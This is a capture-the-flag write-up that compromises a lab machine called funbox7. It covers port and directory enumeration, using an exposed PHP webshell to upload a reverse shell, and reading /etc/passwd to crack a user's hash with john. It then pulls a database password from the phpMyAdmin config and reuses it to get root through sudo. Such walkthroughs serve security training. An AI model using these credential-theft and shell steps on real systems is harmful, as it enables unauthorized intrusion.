# Enumeration

Lets start with nmap
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:50 IST
Nmap scan report for 192.168.221.132
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```

Looking at results, we have just 2 port open: 22 and 80. 

## PORT 80
Navigating to IP gave us default apache page, nothing else. Lets start enumerating for hidden web directories, we'll be using `ffuf`.
```bash
fuf -u http://192.168.221.132/FUZZ -w /usr/share/wordlists/dirb/big.txt -c -e .txt,.html,.php           [5/157]
                                                                                                                                                                         
        /'___\  /'___\           /'___\                                                                                                                                  
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                  
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                 
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.221.132/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .txt .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]         
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10]
mini.php                [Status: 200, Size: 3828, Words: 152, Lines: 115]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 21, Words: 2, Lines: 2]
```
Looking at ffuf results, we have:
- *robots.txt*, but it does not have anything helpful for us
- Another interesting found was ***PhpMyadmin***, but in order to proceed with it, we need to authenticate first. As we dont have any set of credentials, we'll skip this for now.
- Another thing was ***Mini.php***, Navigating to it


### Mini.php
![image](https://user-images.githubusercontent.com/43528306/123503316-f3818e00-d66f-11eb-8181-fc53a9d7ffd7.png)

Its a php webshell.The webshell allows us to upload files directy to root directory of webserver. Here,we can use this to upload a php rev-shell on the box. 
Upload a simple PHP reverse shell and start up the listner.

## Shell as www-data
We got shell as *www-data*. Looking in few directories up, we found our first flag.

Looking at other users present box
```bash
www-data@funbox7:/etc/phpmyadmin$ cat /etc/passwd | grep -i "sh$"
root:x:0:0:root:/root:/bin/bash
karla:x:1000:1000:karla:/home/karla:/bin/bash
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```
Surprisingly, `/etc/passwd` file contained password for user `oracle`. Looking at the hash, we can say that its MD5Crypt. We can crack the hash using either john or hashcat.
We'll use john here with rockyou.
```bash                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$  cat hash                                                                                                                                                        1 ⨯
$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0

┌──(kali㉿kali)-[~]
└─$  john --wordlist=rockyou.txt hash  
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hiphop           (?)
1g 0:00:00:00 DONE (2021-11-24 22:52) 3.846g/s 1476p/s 1476c/s 1476C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed          
```
John immediately cracked the hash, giving us the plain-text password `hiphop`. We can use this to switch to Oracle user. The Oracle User didn't have  any interesting files or any way to escalate to root. 

Looking back, we also had phpmyadmin running on the box.We can start looking for configuration files of phpmyadmin. A quick google search, gave us the location of configuration for PHPmyadmin i.e `/etc/phpmyadmin` directory. Looking in the directory, we have `config-db.php`
```php
www-data@funbox7:/etc/phpmyadmin$ cat config-db.php
cat config-db.php
<?php
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
...[snip]...
?>
```

## Root
We found a password in `config-db.php`. We can use the same password for other users on the box, and we got a hit with *karla* user. We can now login as *Karla* on the box.
Looking at groups,*karla* was a member of sudo group which gave us easy root.
```bash
karla@funbox7:/etc/phpmyadmin$ sudo -l
sudo -l
Matching Defaults entries for karla on funbox7:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karla may run the following commands on funbox7:
    (ALL : ALL) ALL
```
ROOT!!

Refrences
---
- https://man7.org/linux/man-pages/man3/crypt.3.html
